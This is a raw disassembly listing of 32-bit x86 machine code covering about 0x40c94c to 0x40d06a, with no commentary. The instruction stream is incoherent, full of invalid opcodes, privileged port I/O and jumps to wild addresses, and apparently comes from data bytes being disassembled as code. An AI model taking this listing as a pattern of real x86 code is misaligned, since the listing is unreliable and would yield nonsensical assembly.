  40c94c:	(bad)  
  40c94d:	xlat   BYTE PTR ds:[ebx]
  40c94e:	pop    es
  40c94f:	adc    ebp,DWORD PTR [edx]
  40c951:	inc    edx
  40c952:	das    
  40c953:	mov    bh,0x2d
  40c955:	push   es
  40c956:	pop    esp
  40c957:	push   esi
  40c958:	mov    esi,0x7e1bc26c
  40c95d:	stos   DWORD PTR es:[edi],eax
  40c95e:	pop    edi
  40c95f:	xchg   esp,eax
  40c960:	imul   edi,ebp,0xa980c36e
  40c966:	push   0x49f66c2
  40c96b:	ret    
  40c96c:	jmp    0x5823bbba
  40c971:	cmp    BYTE PTR [edi+0x14],dh
  40c974:	mov    edi,0x5496e2b9
  40c979:	pop    eax
  40c97a:	out    0xb1,eax
  40c97c:	imul   eax,esp,0xffffffef
  40c97f:	sub    edx,DWORD PTR [edx+ebp*1+0x12]
  40c983:	pminub mm3,mm5
  40c986:	and    eax,0x5a8ae84c
  40c98b:	daa    
  40c98c:	dec    ebx
  40c98d:	cmc    
  40c98e:	and    ch,BYTE PTR [eax+0x35]
  40c991:	sar    BYTE PTR [eax],1
  40c993:	xchg   DWORD PTR [eax+eax*8+0x9],ebx
  40c997:	daa    
  40c998:	sbb    ebx,DWORD PTR [eax*2-0x544fcbc5]
  40c99f:	sti    
  40c9a0:	cli    
  40c9a1:	push   0xbb0287c5
  40c9a6:	sti    
  40c9a7:	(bad)  
  40c9a8:	and    al,0x7
  40c9aa:	pop    ebx
  40c9ab:	mov    cl,0x4a
  40c9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9ae:	retf   
  40c9af:	fnsave [eax-0x6a]
  40c9b2:	repnz or DWORD PTR [edx+0x59],0xffffff99
  40c9b7:	inc    ebx
  40c9b8:	mov    eax,ds:0xb99edbf8
  40c9bd:	dec    edx
  40c9be:	jb     0x40c9db
  40c9c0:	scas   al,BYTE PTR es:[edi]
  40c9c1:	inc    esp
  40c9c2:	push   ecx
  40c9c3:	jae    0x40ca1c
  40c9c5:	xlat   BYTE PTR ds:[ebx]
  40c9c6:	or     al,0x4f
  40c9c8:	xchg   ebp,eax
  40c9c9:	dec    ebx
  40c9ca:	cmp    DWORD PTR [edx+0x72],eax
  40c9cd:	cmp    BYTE PTR [edx-0x5cbe2fe6],al
  40c9d3:	mov    ds:0x8eb6d9b9,eax
  40c9d8:	mov    esp,0x37ae1074
  40c9dd:	sbb    bh,dl
  40c9df:	in     al,0x70
  40c9e1:	stos   DWORD PTR es:[edi],eax
  40c9e2:	retf   0x1711
  40c9e5:	aas    
  40c9e6:	out    0x5b,eax
  40c9e8:	xchg   ebp,eax
  40c9e9:	dec    eax
  40c9ea:	int3   
  40c9eb:	add    cl,BYTE PTR [eax+0x23]
  40c9ee:	inc    ecx
  40c9ef:	in     al,0xc9
  40c9f1:	loope  0x40c9d1
  40c9f3:	into   
  40c9f4:	mov    al,ds:0x775a5403
  40c9f9:	cmp    DWORD PTR [edi-0x25e301c1],ebx
  40c9ff:	fcomp  QWORD PTR [esi-0x78c28c40]
  40ca05:	push   0x19e01635
  40ca0a:	xchg   dh,bh
  40ca0c:	ja     0x40ca1e
  40ca0e:	cmp    al,0x93
  40ca10:	repnz mov ds:0x2332aa2f,eax
  40ca16:	cld    
  40ca17:	jmp    0xc99bb89c
  40ca1c:	dec    edi
  40ca1d:	pop    ss
  40ca1e:	add    BYTE PTR ds:0xcfadf2fc,dl
  40ca24:	xchg   esi,eax
  40ca25:	mov    cs,ebx
  40ca27:	xlat   BYTE PTR ds:[ebx]
  40ca28:	call   0xf3edaa16
  40ca2d:	dec    DWORD PTR [eax+0x3a]
  40ca30:	sbb    eax,0x432d351d
  40ca35:	mov    bl,cl
  40ca37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca38:	jbe    0x40c9f8
  40ca3a:	cmp    BYTE PTR [eax+0x7f],al
  40ca3d:	push   ecx
  40ca3e:	dec    ebp
  40ca3f:	push   eax
  40ca40:	sbb    eax,0x260eb50b
  40ca45:	mov    cl,0xd
  40ca47:	js     0x40ca6e
  40ca49:	push   ebx
  40ca4a:	mov    ds:0x650c0408,eax
  40ca4f:	mov    ebx,0x5800b29c
  40ca54:	dec    esp
  40ca55:	imul   edi,DWORD PTR [edx],0x9f5a313
  40ca5b:	push   edx
  40ca5c:	bound  edx,QWORD PTR [ecx-0x74]
  40ca5f:	cmc    
  40ca60:	mov    ds:0xff8c3c24,al
  40ca65:	aam    0x95
  40ca67:	cmp    DWORD PTR [eax+0x16],0xffffffc7
  40ca6b:	mov    al,ds:0xcae203ca
  40ca70:	ins    DWORD PTR es:[edi],dx
  40ca71:	jmp    0x3130c39c
  40ca76:	sbb    edi,DWORD PTR [ebp+0xed7589b]
  40ca7c:	and    BYTE PTR [eax-0x672a716c],cl
  40ca82:	scas   al,BYTE PTR es:[edi]
  40ca83:	lock mov eax,ebx
  40ca86:	pop    ebx
  40ca87:	mov    edi,0xdebcf6f5
  40ca8c:	cs mov cl,dh
  40ca8f:	shr    DWORD PTR ds:0x7d43028c,1
  40ca95:	dec    esp
  40ca96:	pop    es
  40ca97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca98:	outs   dx,BYTE PTR ds:[esi]
  40ca99:	shl    BYTE PTR [eax-0x5961004a],1
  40ca9f:	mov    al,0x82
  40caa1:	mov    ah,0xd0
  40caa3:	xor    eax,0xf2417427
  40caa8:	stos   DWORD PTR es:[edi],eax
  40caa9:	and    al,0x57
  40caab:	add    BYTE PTR [ecx+0x74],cl
  40caae:	and    al,0x46
  40cab0:	dec    eax
  40cab1:	dec    eax
  40cab2:	jecxz  0x40ca92
  40cab4:	stos   BYTE PTR es:[edi],al
  40cab5:	(bad)  [esi-0x62fb9ad6]
  40cabb:	mov    DWORD PTR [ebx+0x65],esi
  40cabe:	(bad)  
  40cabf:	dec    ecx
  40cac0:	repnz in eax,dx
  40cac2:	push   esi
  40cac3:	cs and eax,0x62a16384
  40cac9:	adc    eax,DWORD PTR [esi+0x64]
  40cacc:	loop   0x40cab8
  40cace:	pushf  
  40cacf:	jb     0x40caf3
  40cad1:	clc    
  40cad2:	stc    
  40cad3:	je     0x40cb4a
  40cad5:	push   edx
  40cad6:	push   edx
  40cad7:	pop    ebp
  40cad8:	callw  0x72bc
  40cadc:	mov    eax,0xebea9c71
  40cae1:	rcr    DWORD PTR [ebx-0x1612971f],cl
  40cae7:	in     eax,0x4c
  40cae9:	jg     0x40caed
  40caeb:	test   BYTE PTR [edx+0x1a],0x3e
  40caef:	aas    
  40caf0:	in     al,0xc
  40caf2:	mov    ds:0xfeee103d,eax
  40caf7:	mov    ebp,DWORD PTR [esp+edx*1+0x74]
  40cafb:	mov    cl,BYTE PTR [edx]
  40cafd:	vxorps ymm1,ymm7,YMMWORD PTR [esi]
  40cb01:	mov    al,0x64
  40cb03:	popa   
  40cb04:	add    al,0x7d
  40cb06:	mov    al,0xe5
  40cb08:	fisubr WORD PTR [eax+0x7da44c1]
  40cb0e:	into   
  40cb0f:	aam    0x7b
  40cb11:	sub    esp,ebp
  40cb13:	div    dl
  40cb15:	jp     0x40cb06
  40cb17:	ror    BYTE PTR [ecx+0x5c],0xc7
  40cb1b:	dec    ebx
  40cb1c:	xor    al,0xae
  40cb1e:	sar    DWORD PTR [ebx+0x67],1
  40cb21:	pop    esi
  40cb22:	mov    dh,0x4e
  40cb24:	lock pop esi
  40cb26:	retf   0x45dd
  40cb29:	add    DWORD PTR [esp+eax*8-0x5f],ebp
  40cb2d:	ret    0x85dd
  40cb30:	add    al,0xf7
  40cb32:	es call 0xdfc89804
  40cb38:	adc    edx,ebx
  40cb3a:	jnp    0x40cbbb
  40cb3c:	add    ch,dl
  40cb3e:	add    bl,BYTE PTR [edx+ebx*1-0x11f40db8]
  40cb45:	dec    BYTE PTR [ebp-0x11]
  40cb48:	add    eax,0xad314903
  40cb4d:	pop    ds
  40cb4e:	loopne 0x40cb08
  40cb50:	cld    
  40cb51:	sbb    eax,0xd0a899c7
  40cb56:	lods   al,BYTE PTR ds:[esi]
  40cb57:	cmc    
  40cb58:	add    bh,al
  40cb5a:	jno    0x40cb44
  40cb5c:	fs inc esi
  40cb5e:	push   es
  40cb5f:	pusha  
  40cb60:	jecxz  0x40cbb5
  40cb62:	nop
  40cb63:	setns  BYTE PTR [esp+ecx*8]
  40cb67:	mov    cl,0xb5
  40cb69:	mov    al,BYTE PTR [edx+0x22]
  40cb6c:	xchg   ecx,eax
  40cb6d:	add    al,ch
  40cb6f:	mov    WORD PTR [edi-0x1d],fs
  40cb72:	aad    0x7
  40cb74:	xchg   ebp,eax
  40cb75:	daa    
  40cb76:	imul   eax,ecx,0x81dbc9a5
  40cb7c:	sub    eax,0xcbc516f
  40cb81:	aad    0x45
  40cb83:	lods   eax,DWORD PTR ds:[esi]
  40cb84:	pop    es
  40cb85:	ret    
  40cb86:	jae    0x40cbfb
  40cb88:	sahf   
  40cb89:	adc    BYTE PTR ds:[ebp+edx*8+0x36471a5],ah
  40cb91:	test   eax,0x84d89ba7
  40cb96:	sahf   
  40cb97:	and    al,0xec
  40cb99:	or     BYTE PTR [edx-0x1d5d835f],dh
  40cb9f:	ret    0x5e0
  40cba2:	dec    ecx
  40cba3:	and    eax,0xb24d30da
  40cba8:	mov    dh,0x6a
  40cbaa:	out    dx,al
  40cbab:	nop
  40cbac:	mov    ch,BYTE PTR [edi]
  40cbae:	loope  0x40cc19
  40cbb0:	sub    eax,0x2ce1d0c5
  40cbb5:	pop    esp
  40cbb6:	adc    al,0x45
  40cbb8:	xchg   ebx,eax
  40cbb9:	mov    esi,edx
  40cbbb:	or     al,0xb0
  40cbbd:	(bad)  
  40cbbe:	repz gs int 0x30
  40cbc2:	push   ds
  40cbc3:	out    dx,eax
  40cbc4:	inc    edx
  40cbc5:	nop
  40cbc6:	push   ebp
  40cbc7:	pop    esi
  40cbc8:	nop
  40cbc9:	mov    al,0x8b
  40cbcb:	sti    
  40cbcc:	data16 fsub QWORD PTR [ebp+0x55]
  40cbd0:	(bad)  
  40cbd1:	or     al,ch
  40cbd3:	out    0xd,al
  40cbd5:	adc    al,0x74
  40cbd7:	push   esi
  40cbd8:	imul   edx,DWORD PTR [ebx+0x33b60898],0x3a330338
  40cbe2:	inc    ebx
  40cbe3:	cwde   
  40cbe4:	sbb    eax,0x2c844496
  40cbe9:	cmp    al,0x88
  40cbeb:	arpl   bp,bx
  40cbed:	fadd   st(7),st
  40cbef:	mov    ds:0xeb08ed9b,al
  40cbf4:	lods   al,BYTE PTR ds:[esi]
  40cbf5:	jo     0x40cbfc
  40cbf7:	out    0x69,al
  40cbf9:	dec    esp
  40cbfa:	rol    DWORD PTR [esi],cl
  40cbfc:	sbb    BYTE PTR [ebx],dh
  40cbfe:	ins    BYTE PTR es:[edi],dx
  40cbff:	jg     0x40cb9a
  40cc01:	js     0x40cba8
  40cc03:	adc    eax,0x50aa2dce
  40cc08:	cmp    BYTE PTR fs:[eax],ch
  40cc0b:	push   ecx
  40cc0c:	dec    eax
  40cc0d:	inc    edx
  40cc0e:	or     eax,DWORD PTR [eax+0x41]
  40cc11:	clc    
  40cc12:	jg     0x40cbf2
  40cc14:	adc    al,0x65
  40cc16:	jp     0x40cc1a
  40cc18:	loop   0x40cc69
  40cc1a:	xor    eax,0xf4a86afd
  40cc1f:	pop    ecx
  40cc20:	xchg   edx,eax
  40cc21:	mov    ds:0xecfb55d,al
  40cc26:	cs pop esi
  40cc28:	sbb    BYTE PTR [eax-0x4404c87c],ch
  40cc2e:	or     al,0xe2
  40cc30:	jl     0x40cc7d
  40cc32:	enter  0x4c43,0x1b
  40cc36:	mov    DWORD PTR [edx-0x5e],0x336d10d0
  40cc3d:	add    ch,dh
  40cc3f:	cmp    eax,DWORD PTR [ecx]
  40cc41:	cwde   
  40cc42:	sti    
  40cc43:	mov    ds:0xd6729aaa,eax
  40cc48:	dec    ebx
  40cc49:	das    
  40cc4a:	cmp    al,0x64
  40cc4c:	pop    esi
  40cc4e:	or     bl,BYTE PTR [edi+0x12f68b06]
  40cc54:	(bad)  
  40cc55:	cmc    
  40cc56:	nop
  40cc57:	imul   ebp,esp,0x30
  40cc5a:	add    al,0x5a
  40cc5c:	mov    ebp,0x7e65a2ee
  40cc61:	stos   BYTE PTR es:[edi],al
  40cc62:	mov    dh,0xf8
  40cc64:	or     BYTE PTR [ebp+0x29d41887],ch
  40cc6a:	push   0xbc006e86
  40cc6f:	jmp    0x40cc7b
  40cc71:	mov    esp,0xe2ff0698
  40cc76:	mov    bh,0x96
  40cc78:	jae    0x40cc56
  40cc7a:	imul   ebx,eax,0x38c84227
  40cc80:	add    dl,al
  40cc82:	mov    al,0xfb
  40cc84:	in     al,0xc2
  40cc86:	add    ah,BYTE PTR [esi-0x3b2cee91]
  40cc8c:	mov    edx,0x170b401b
  40cc91:	ds loop 0x40cc4d
  40cc94:	lea    ecx,[ebp-0x6c8d1e1c]
  40cc9a:	mov    ch,0xd4
  40cc9c:	mov    DWORD PTR [esi+0x4d],esi
  40cc9f:	push   cs
  40cca0:	(bad)  
  40cca1:	jle    0x40cc67
  40cca3:	pop    es
  40cca4:	cmp    bl,BYTE PTR [ebx]
  40cca6:	or     eax,0x6d7fb896
  40ccab:	aad    0x63
  40ccad:	popa   
  40ccae:	popa   
  40ccaf:	or     BYTE PTR [ebp-0x38],cl
  40ccb2:	daa    
  40ccb3:	fucomp st(1)
  40ccb5:	add    esp,esi
  40ccb7:	jno    0x40cc71
  40ccb9:	(bad)  
  40ccba:	test   al,0x44
  40ccbc:	inc    ebp
  40ccbd:	pop    eax
  40ccbe:	ficom  DWORD PTR [esi+0x33ce7976]
  40ccc4:	ins    DWORD PTR es:[edi],dx
  40ccc5:	or     ah,dl
  40ccc7:	jg     0x40cc66
  40ccc9:	inc    ecx
  40ccca:	pop    ds
  40cccb:	hlt    
  40cccc:	bound  ecx,QWORD PTR [ebp+0x4669f973]
  40ccd2:	sub    BYTE PTR [ebp-0x25],dh
  40ccd5:	sbb    BYTE PTR [ebx-0x4cd94391],cl
  40ccdb:	and    ch,dh
  40ccdd:	or     edi,DWORD PTR [esi+ebx*2]
  40cce0:	xchg   ebx,eax
  40cce1:	icebp  
  40cce2:	or     al,0xc6
  40cce4:	mov    cs,WORD PTR [edi-0x28ed7b84]
  40ccea:	test   al,0x6a
  40ccec:	lds    esi,FWORD PTR [edx]
  40ccee:	sub    eax,0xf64bde5e
  40ccf3:	stos   DWORD PTR es:[edi],eax
  40ccf4:	retf   
  40ccf5:	fdivr  QWORD PTR [ebx]
  40ccf7:	inc    ecx
  40ccf8:	iret   
  40ccf9:	xchg   ebx,eax
  40ccfa:	pop    ds
  40ccfb:	pop    ecx
  40ccfc:	leave  
  40ccfd:	nop
  40ccfe:	loop   0x40cd73
  40cd00:	mov    dl,0x90
  40cd02:	loopne 0x40cd7d
  40cd04:	mov    ah,0xd
  40cd06:	stos   BYTE PTR es:[edi],al
  40cd07:	outs   dx,DWORD PTR ds:[esi]
  40cd08:	aas    
  40cd09:	adc    edi,DWORD PTR [esi+edi*2+0x47]
  40cd0d:	enter  0xfe3a,0xcd
  40cd11:	add    esi,esp
  40cd13:	ds addr16 push ds
  40cd16:	adc    eax,0xf0260e68
  40cd1b:	ficomp WORD PTR [edx+edx*2]
  40cd1e:	les    ebx,FWORD PTR [eax]
  40cd20:	repnz or cl,BYTE PTR [ebp+0xa]
  40cd24:	cdq    
  40cd25:	sbb    eax,0x9d7d21d9
  40cd2a:	icebp  
  40cd2b:	sub    eax,0x87a016d
  40cd30:	popa   
  40cd31:	test   BYTE PTR [ebp-0x28],0x76
  40cd35:	jo     0x40ccc1
  40cd37:	dec    edi
  40cd38:	inc    esp
  40cd39:	and    eax,0x92473988
  40cd3e:	pop    edx
  40cd3f:	cmp    al,0x61
  40cd41:	sbb    al,0x5
  40cd43:	add    eax,0x2572ed5
  40cd48:	mov    BYTE PTR ds:0xd42bbbb4,ch
  40cd4e:	add    edx,ebx
  40cd50:	push   0xc359516b
  40cd55:	xchg   ebx,eax
  40cd56:	push   0xfe4d8404
  40cd5b:	jl     0x40cd08
  40cd5d:	mov    esi,eax
  40cd5f:	pusha  
  40cd60:	dec    ebp
  40cd61:	cmp    dh,ch
  40cd63:	push   esp
  40cd64:	mov    gs,WORD PTR [ecx]
  40cd66:	xchg   BYTE PTR [ebp+ebx*2-0x7098cec5],dh
  40cd6d:	cmc    
  40cd6e:	xchg   edx,eax
  40cd6f:	in     al,dx
  40cd70:	loopne 0x40cde4
  40cd72:	cli    
  40cd73:	imul   esp,DWORD PTR [edi],0x4fb696c2
  40cd79:	push   ss
  40cd7a:	lods   eax,DWORD PTR ds:[esi]
  40cd7b:	rol    ebp,1
  40cd7d:	fdiv   DWORD PTR [esi-0x11]
  40cd80:	pop    es
  40cd81:	jmp    FWORD PTR [edx]
  40cd83:	shr    DWORD PTR [ebx-0xe],1
  40cd86:	mov    ch,0xbc
  40cd88:	and    esi,DWORD PTR [edi]
  40cd8a:	xchg   esi,eax
  40cd8b:	pusha  
  40cd8c:	mov    ebx,0xcf764528
  40cd91:	mov    dl,0x5b
  40cd93:	ja     0x40ce05
  40cd95:	push   0x3e
  40cd97:	fucompp 
  40cd99:	add    eax,0xc6ec229c
  40cd9e:	adc    DWORD PTR [ebx-0x3314f132],ebx
  40cda4:	pop    ss
  40cda5:	aad    0x85
  40cda7:	xchg   DWORD PTR [edi+0x68dd3749],ebp
  40cdad:	dec    ebp
  40cdae:	repnz cmp cl,BYTE PTR [edi+0x4a]
  40cdb2:	add    al,0x95
  40cdb4:	stc    
  40cdb5:	test   BYTE PTR [ebx+edi*4],dh
  40cdb8:	sahf   
  40cdb9:	sbb    dl,BYTE PTR [ebx+0x7d994db6]
  40cdbf:	rol    BYTE PTR [ebp-0x74f64c06],cl
  40cdc5:	jo     0x40cdd9
  40cdc7:	inc    esi
  40cdc8:	and    eax,0x48d7c4a6
  40cdcd:	pop    es
  40cdce:	sub    ah,BYTE PTR [eax-0x6f]
  40cdd1:	ret    0x38a8
  40cdd4:	mov    ds:0x7933105,al
  40cdd9:	test   bh,ch
  40cddb:	fwait
  40cddc:	std    
  40cddd:	push   eax
  40cdde:	mov    DWORD PTR [edi-0x37f39181],edx
  40cde4:	push   ss
  40cde5:	inc    DWORD PTR [edx]
  40cde7:	fstp   TBYTE PTR [esi]
  40cde9:	enter  0x2b95,0xc7
  40cded:	fcmovne st,st(2)
  40cdef:	xor    BYTE PTR [ebx-0x54],cl
  40cdf2:	pop    ecx
  40cdf3:	jns    0x40cd87
  40cdf5:	cmp    BYTE PTR [edx+0x4d],0x5c
  40cdf9:	add    eax,ebp
  40cdfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdfc:	ja     0x40cdfa
  40cdfe:	mov    ebx,0x12acc480
  40ce03:	retf   0x4e00
  40ce06:	jae    0x40cdbf
  40ce08:	popf   
  40ce09:	push   ss
  40ce0a:	jle    0x40ce0e
  40ce0c:	les    ebx,FWORD PTR [eax]
  40ce0e:	fs jo  0x40ce23
  40ce11:	push   ecx
  40ce12:	iret   
  40ce13:	loop   0x40cd96
  40ce15:	push   esp
  40ce16:	push   es
  40ce17:	and    ebx,eax
  40ce19:	imul   esp,DWORD PTR [edi-0x418ec4a2],0x1b
  40ce20:	pushf  
  40ce21:	imul   eax,ebx,0x42
  40ce24:	pop    edi
  40ce25:	std    
  40ce26:	inc    esi
  40ce27:	mov    WORD PTR [ebx-0x4d],ss
  40ce2a:	cwde   
  40ce2b:	in     eax,dx
  40ce2c:	out    0x8,al
  40ce2e:	jge    0x40cdd0
  40ce30:	dec    esi
  40ce31:	fdivr  st(4),st
  40ce33:	cdq    
  40ce34:	jl     0x40ce25
  40ce36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce37:	lods   eax,DWORD PTR ds:[esi]
  40ce38:	jbe    0x40ce4a
  40ce3a:	sub    BYTE PTR [ebx-0x20a80cf6],al
  40ce40:	retf   0x1042
  40ce43:	pop    ecx
  40ce44:	lock cmc 
  40ce46:	(bad)  
  40ce48:	daa    
  40ce49:	(bad)  
  40ce4b:	add    eax,ebp
  40ce4d:	sub    bh,BYTE PTR ds:0x1395349
  40ce53:	mov    BYTE PTR [ebp-0x1a],dh
  40ce56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce57:	sub    eax,0x830608
  40ce5c:	in     al,0xfe
  40ce5e:	dec    edx
  40ce5f:	icebp  
  40ce60:	fidiv  DWORD PTR [ebx+0x1c4f8288]
  40ce66:	dec    eax
  40ce67:	xchg   ecx,eax
  40ce68:	sub    al,0xd5
  40ce6a:	scas   al,BYTE PTR es:[edi]
  40ce6b:	xchg   edx,eax
  40ce6c:	dec    ecx
  40ce6d:	mov    ds:0x6ca8412c,al
  40ce72:	mov    edx,0xce645e2d
  40ce77:	aaa    
  40ce78:	pusha  
  40ce79:	dec    ecx
  40ce7a:	leave  
  40ce7b:	inc    esi
  40ce7c:	in     al,dx
  40ce7d:	fild   WORD PTR [ebp-0x7e]
  40ce80:	test   al,0xd0
  40ce82:	inc    ebp
  40ce83:	xlat   BYTE PTR ds:[ebx]
  40ce84:	loop   0x40ce37
  40ce86:	mov    edx,0x66d70c17
  40ce8b:	xchg   ecx,eax
  40ce8c:	data16 (bad) 
  40ce8e:	stos   BYTE PTR es:[edi],al
  40ce8f:	pop    ebp
  40ce90:	loopne 0x40ced1
  40ce92:	pushf  
  40ce93:	jo     0x40ce1c
  40ce95:	mov    ebp,0x8f3bab86
  40ce9a:	sub    al,0xc2
  40ce9c:	add    dh,bl
  40ce9e:	repz dec edx
  40cea0:	fadd   QWORD PTR ds:0xdc200f16
  40cea6:	lahf   
  40cea7:	mov    edi,DWORD PTR [ecx+0x52]
  40ceaa:	mov    ch,0xf
  40ceac:	push   ss
  40cead:	pop    ebx
  40ceae:	mov    dl,0xfc
  40ceb0:	jo     0x40cef3
  40ceb2:	pushf  
  40ceb3:	xchg   ebp,eax
  40ceb4:	mov    ds:0x4f205a7c,al
  40ceb9:	mov    ds:0x9c5a4a83,eax
  40cebe:	jae    0x40ce68
  40cec0:	jo     0x40ceb1
  40cec2:	mov    ch,0xa1
  40cec4:	push   ebx
  40cec5:	mov    ebx,0xc67dd812
  40ceca:	into   
  40cecb:	sbb    eax,0x222aea2b
  40ced0:	cdq    
  40ced1:	xchg   ecx,eax
  40ced2:	andps  xmm1,XMMWORD PTR [edi]
  40ced5:	sub    al,bh
  40ced7:	mov    ds:0x54513827,al
  40cedc:	mov    esp,0x2a7afb78
  40cee1:	xor    BYTE PTR [edx-0x6d],dl
  40cee4:	js     0x40cedb
  40cee6:	jo     0x40cf2e
  40cee8:	and    DWORD PTR [edx+0xd7802c1],ebx
  40ceee:	or     DWORD PTR [ebp+0x3032cf2c],0x56
  40cef5:	xchg   edx,eax
  40cef6:	out    dx,al
  40cef7:	idiv   BYTE PTR [eax-0x5c]
  40cefa:	(bad)  
  40cefb:	loopne 0x40cf1c
  40cefd:	fwait
  40cefe:	xchg   edx,eax
  40ceff:	sti    
  40cf00:	fs iret 
  40cf02:	lahf   
  40cf03:	ds dec edx
  40cf05:	pushf  
  40cf06:	push   cs
  40cf07:	in     eax,0x7c
  40cf09:	arpl   WORD PTR [esi],di
  40cf0b:	fld    DWORD PTR [esi]
  40cf0d:	leave  
  40cf0e:	xor    BYTE PTR [eax],al
  40cf10:	push   edx
  40cf11:	xor    cl,bh
  40cf13:	mov    dl,0xa8
  40cf15:	retf   
  40cf16:	jp     0x40ceea
  40cf18:	inc    edx
  40cf19:	out    dx,al
  40cf1a:	jne    0x40cebc
  40cf1c:	mov    ah,BYTE PTR [eax-0x61]
  40cf1f:	cli    
  40cf20:	mov    cl,0xf4
  40cf22:	(bad)  
  40cf23:	mov    bh,0xfe
  40cf25:	cmp    al,0xe8
  40cf27:	mov    edi,0x1dff44d9
  40cf2c:	or     BYTE PTR [edi],bh
  40cf2e:	push   ebx
  40cf2f:	jmp    0x40cf06
  40cf31:	add    ch,ah
  40cf33:	stos   DWORD PTR es:[edi],eax
  40cf34:	mov    bl,ch
  40cf36:	lock jge 0x40cf2c
  40cf39:	out    dx,eax
  40cf3a:	outs   dx,DWORD PTR ds:[esi]
  40cf3b:	aas    
  40cf3c:	adc    eax,DWORD PTR [edx]
  40cf3e:	rol    BYTE PTR [eax-0x57],0x57
  40cf42:	ds jmp 0x40cf32
  40cf45:	(bad)  
  40cf46:	std    
  40cf47:	scas   al,BYTE PTR es:[edi]
  40cf48:	mov    al,ds:0x97a99d0b
  40cf4d:	sbb    edx,DWORD PTR [eax]
  40cf4f:	aaa    
  40cf50:	push   edx
  40cf51:	jp     0x40cf1f
  40cf53:	aam    0xb0
  40cf55:	xor    al,al
  40cf57:	fs push esp
  40cf59:	dec    edi
  40cf5a:	fld    DWORD PTR [ecx]
  40cf5c:	xchg   edi,eax
  40cf5d:	fdivr  QWORD PTR [edx+eiz*4+0x4d]
  40cf61:	mov    al,0x35
  40cf63:	or     dh,BYTE PTR [eax+eax*8-0x15]
  40cf67:	sbb    al,0x2c
  40cf69:	bound  ecx,QWORD PTR [edx]
  40cf6b:	in     eax,0xe3
  40cf6d:	iret   
  40cf6e:	in     al,dx
  40cf6f:	loope  0x40cf1e
  40cf71:	jns    0x40cf17
  40cf73:	add    al,0x3b
  40cf75:	push   ss
  40cf76:	dec    edi
  40cf77:	in     eax,dx
  40cf78:	rol    ch,0xf7
  40cf7b:	(bad)  
  40cf7d:	xor    eax,0x7a6af373
  40cf82:	or     esp,ecx
  40cf84:	jl     0x40cfdd
  40cf86:	xchg   esp,eax
  40cf87:	out    0x43,eax
  40cf89:	stc    
  40cf8a:	push   ecx
  40cf8b:	call   0x3eac2c88
  40cf90:	pop    esp
  40cf91:	push   ss
  40cf92:	pop    esp
  40cf93:	add    bh,ah
  40cf95:	pop    es
  40cf96:	adc    esi,DWORD PTR [ebx-0x6a]
  40cf99:	pop    edi
  40cf9a:	pop    eax
  40cf9b:	aaa    
  40cf9c:	lock in eax,dx
  40cf9e:	sbb    BYTE PTR [ecx-0x39],dh
  40cfa1:	mov    edi,0xab416ca1
  40cfa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa7:	xor    DWORD PTR [ecx+0x2d],esi
  40cfaa:	mov    eax,0x3859a991
  40cfaf:	xlat   BYTE PTR ds:[ebx]
  40cfb0:	mov    ebx,0x6fa1c989
  40cfb5:	mov    bh,0x6e
  40cfb7:	stos   DWORD PTR es:[edi],eax
  40cfb8:	cmp    esi,esi
  40cfba:	ds push ebx
  40cfbc:	(bad)  
  40cfbd:	cli    
  40cfbe:	cld    
  40cfbf:	fiadd  WORD PTR [ecx-0x4c]
  40cfc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfc3:	xor    DWORD PTR [eax],ebx
  40cfc5:	mov    ecx,0x67438ab1
  40cfca:	ja     0x40cf77
  40cfcc:	setb   BYTE PTR [edi-0x535b6382]
  40cfd3:	loop   0x40cff1
  40cfd5:	xor    ecx,DWORD PTR [eax]
  40cfd7:	addr16 hlt 
  40cfd9:	mov    esi,DWORD PTR [edi]
  40cfdb:	jl     0x40d000
  40cfdd:	xor    ecx,ebx
  40cfdf:	dec    ecx
  40cfe0:	into   
  40cfe1:	pop    ds
  40cfe2:	pop    edi
  40cfe3:	or     eax,ebx
  40cfe5:	imul   eax,DWORD PTR [ebx],0xfafa8c8a
  40cfeb:	stc    
  40cfec:	inc    ebp
  40cfed:	pop    ebp
  40cfee:	test   eax,0xd40c069c
  40cff3:	jo     0x40cfad
  40cff5:	sahf   
  40cff6:	adc    BYTE PTR [ecx],ah
  40cff8:	jnp    0x40d04f
  40cffa:	es sbb edx,esp
  40cffd:	xor    eax,0x3727ac9f
  40d002:	cld    
  40d003:	jo     0x40cfc1
  40d005:	xchg   DWORD PTR [ebx+0x5d],edi
  40d008:	inc    ecx
  40d009:	jmp    0xcf84f77c
  40d00e:	xor    BYTE PTR [ebx],ah
  40d010:	cmp    BYTE PTR [edi+0x1268e3e7],bh
  40d016:	(bad)  
  40d017:	xor    DWORD PTR [eax],edi
  40d019:	sub    ecx,DWORD PTR [eax]
  40d01b:	in     al,0x9f
  40d01d:	inc    esp
  40d01e:	test   BYTE PTR [edi-0x3f33938a],bh
  40d024:	ins    BYTE PTR es:[edi],dx
  40d025:	daa    
  40d026:	mov    al,BYTE PTR [edi]
  40d028:	fidivr WORD PTR [edx]
  40d02a:	lea    ebx,[eax]
  40d02c:	js     0x40cffd
  40d02e:	enter  0x9b5,0x80
  40d032:	shl    BYTE PTR [edi-0x61],cl
  40d035:	sub    dh,BYTE PTR [edi]
  40d037:	nop
  40d038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d039:	xor    edx,0x6a
  40d03c:	push   ss
  40d03d:	ror    ebp,1
  40d03f:	mov    al,0x41
  40d041:	sbb    edx,DWORD PTR fs:[ebp+0x70]
  40d045:	js     0x40d05f
  40d047:	div    ebp
  40d049:	leave  
  40d04a:	imul   edi,esp,0xffffffff
  40d04d:	mov    dl,0xb6
  40d04f:	(bad)  
  40d050:	call   0xf4f12aea
  40d055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d056:	jb     0x40d04a
  40d058:	enter  0xbeda,0xaa
  40d05c:	push   edx
  40d05d:	cli    
  40d05e:	je     0x40d090
  40d060:	add    cl,bl
  40d062:	cmp    BYTE PTR [ebx],dh
  40d064:	mov    ?,WORD PTR [edi]
  40d066:	cwde   
  40d067:	xor    eax,eax
  40d069:	popf   
  40d06a:	mov    DWORD PTR [eax+0x3513c18f],eax
